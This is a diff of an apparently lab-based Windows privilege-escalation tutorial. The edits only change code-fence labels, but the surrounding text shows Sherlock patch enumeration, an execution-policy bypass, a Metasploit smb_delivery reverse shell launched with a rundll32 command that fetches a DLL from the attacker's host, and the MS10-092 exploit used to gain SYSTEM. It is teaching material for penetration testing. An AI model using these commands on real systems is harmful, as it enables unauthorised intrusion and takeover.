@@ -37,8 +37,7 @@ For an older OS like Windows Server 2008, we can use an enumeration script like 
 
 Let's first use WMI to check for missing KBs.
 
-```
-        cmd
+```bat
 C:\htb> wmic qfe
 
 Caption                                     CSName      Description  FixComments  HotFixID   InstallDate  InstalledBy               InstalledOn  Name  ServicePackInEffect  Status
@@ -51,8 +50,7 @@ A quick Google search of the last installed hotfix shows us that this system is 
 
 Let's run Sherlock to gather more information.
 
-```
-        powershell
+```powershell
 PS C:\htb> Set-ExecutionPolicy bypass -Scope process
 
 Execution Policy Change
@@ -141,8 +139,7 @@ VulnStatus : Not Vulnerable
 
 From the output, we can see several missing patches. From here, let's get a Metasploit shell back on the system and attempt to escalate privileges using one of the identified CVEs. First, we need to obtain a `Meterpreter` reverse shell. We can do this several ways, but one easy way is using the `smb_delivery` module.
 
-```
-        shellsession
+```shellsession
 msf6 exploit(windows/smb/smb_delivery) > search smb_delivery
 
 Matching Modules
@@ -204,8 +201,7 @@ rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
 
 Open a cmd console on the target host and paste in the `rundll32.exe` command.
 
-```
-        cmd
+```bat
 C:\htb> rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
 ```
 
@@ -213,8 +209,7 @@ C:\htb> rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
 
 We get a call back quickly.
 
-```
-        shellsession
+```shellsession
 msf6 exploit(windows/smb/smb_delivery) > [*] Sending stage (175174 bytes) to 10.129.43.15
 [*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.129.43.15:49609) at 2021-05-12 15:55:05 -0400
 ```
@@ -223,8 +218,7 @@ msf6 exploit(windows/smb/smb_delivery) > [*] Sending stage (175174 bytes) to 10.
 
 From here, let's search for the [MS10\_092 Windows Task Scheduler '.XML' Privilege Escalation](https://www.exploit-db.com/exploits/19930) module.
 
-```
-        shellsession
+```shellsession
 msf6 exploit(windows/smb/smb_delivery) > search 2010-3338
 
 Matching Modules
@@ -241,8 +235,7 @@ msf6 exploit(windows/smb/smb_delivery) use 0
 
 Before using the module in question, we need to hop into our Meterpreter shell and migrate to a 64-bit process, or the exploit will not work. We could have also chosen an x64 Meterpeter payload during the `smb_delivery` step.
 
-```
-        shellsession
+```shellsession
 msf6 post(multi/recon/local_exploit_suggester) > sessions -i 1
 
 [*] Starting interaction with 1...
@@ -313,8 +306,7 @@ meterpreter > background
 
 Once this is set, we can now set up the privilege escalation module by specifying our current Meterpreter session, setting our tun0 IP for the LHOST, and a call-back port of our choosing.
 
-```
-        shellsession
+```shellsession
 msf6 exploit(windows/local/ms10_092_schelevator) > set SESSION 1
 
 SESSION => 1
@@ -351,8 +343,7 @@ Exploit target:
 
 If all goes to plan, once we type `exploit`, we will receive a new Meterpreter shell as the `NT AUTHORITY\SYSTEM` account and can move on to perform any necessary post-exploitation.
 
-```
-        shellsession
+```shellsession
 msf6 exploit(windows/local/ms10_092_schelevator) > exploit
 
 [*] Started reverse TCP handler on 10.10.14.3:4443
